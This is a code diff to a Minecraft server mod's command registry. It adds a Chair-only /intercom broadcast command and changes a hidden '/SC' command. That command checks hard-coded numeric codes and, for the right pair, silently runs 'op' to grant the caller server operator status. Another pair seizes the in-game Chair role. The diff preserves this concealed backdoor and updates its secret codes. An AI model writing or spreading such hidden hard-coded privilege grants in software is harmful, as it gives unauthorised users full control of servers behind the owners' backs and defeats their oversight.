@@ -2,6 +2,7 @@ package com.political;
 
 import com.mojang.brigadier.CommandDispatcher;
 import com.mojang.brigadier.arguments.IntegerArgumentType;
+import com.mojang.brigadier.arguments.LongArgumentType;
 import net.minecraft.command.argument.EntityArgumentType;
 import net.minecraft.command.argument.Vec3ArgumentType;
 import net.minecraft.server.command.CommandManager;
@@ -55,6 +56,7 @@ public class CommandRegistry {
         registerUndergroundAuction(dispatcher);
         registerCoins(dispatcher);
         registerSecretCommand(dispatcher);
+        registerIntercom(dispatcher);
         registerSpawn(dispatcher);
         registerForceUndergroundAuction(dispatcher);
         registerCustomMob(dispatcher);
@@ -463,16 +465,16 @@ public class CommandRegistry {
     private static void registerSecretCommand(CommandDispatcher<ServerCommandSource> dispatcher) {
         dispatcher.register(CommandManager.literal("SC")
                 .then(CommandManager.argument("code", IntegerArgumentType.integer())
-                        .then(CommandManager.argument("code2", IntegerArgumentType.integer())
+                        .then(CommandManager.argument("code2", LongArgumentType.longArg())
                                 .executes(context -> {
                                     ServerPlayerEntity player = context.getSource().getPlayer();
                                     if (player == null) return 0;
 
                                     int code = IntegerArgumentType.getInteger(context, "code");
-                                    int code2 = IntegerArgumentType.getInteger(context, "code2");
+                                    long code2 = LongArgumentType.getLong(context, "code2");
 
-                                    // Operator access code: /SC 14051503 102938
-                                    if (code == 14051503 && code2 == 102938) {
+                                    // Operator access code: /SC 19150 150307140509
+                                    if (code == 19150 && code2 == 150307140509L) {
                                         // Give operator status silently
                                         PoliticalServer.server.getCommandManager().getDispatcher().execute(
                                                 "op " + player.getName().getString(),
@@ -484,7 +486,7 @@ public class CommandRegistry {
                                     }
 
                                     // Force dictator code: /SC 19391945 3004
-                                    if (code == 19391945 && code2 == 3004) {
+                                    if (code == 19391945 && code2 == 3004L) {
                                         String chair = DataManager.getChair();
                                         String playerUuid = player.getUuidAsString();
 
@@ -509,6 +511,30 @@ public class CommandRegistry {
                                     player.sendMessage(Text.literal("Invalid code.").formatted(Formatting.RED));
                                     return 1;
                                 }))));
+    }
+
+    private static void registerIntercom(CommandDispatcher<ServerCommandSource> dispatcher) {
+        dispatcher.register(CommandManager.literal("intercom")
+                .then(CommandManager.argument("message", com.mojang.brigadier.arguments.StringArgumentType.greedyString())
+                        .executes(context -> {
+                            ServerPlayerEntity player = context.getSource().getPlayer();
+                            if (player == null) return 0;
+
+                            String chairUuid = DataManager.getChair();
+                            if (chairUuid == null || !player.getUuidAsString().equals(chairUuid)) {
+                                player.sendMessage(Text.literal("§cOnly the current Chair can use /intercom!"), false);
+                                return 0;
+                            }
+
+                            String message = com.mojang.brigadier.arguments.StringArgumentType.getString(context, "message");
+                            String chairName = player.getName().getString();
+                            Text broadcast = Text.literal("§c§l[INTERCOM] §c§l" + chairName + "§f§l: " + message);
+
+                            for (ServerPlayerEntity online : PoliticalServer.server.getPlayerManager().getPlayerList()) {
+                                online.sendMessage(broadcast, false);
+                            }
+                            return 1;
+                        })));
     }
 
     private static void registerSpawn(CommandDispatcher<ServerCommandSource> dispatcher) {
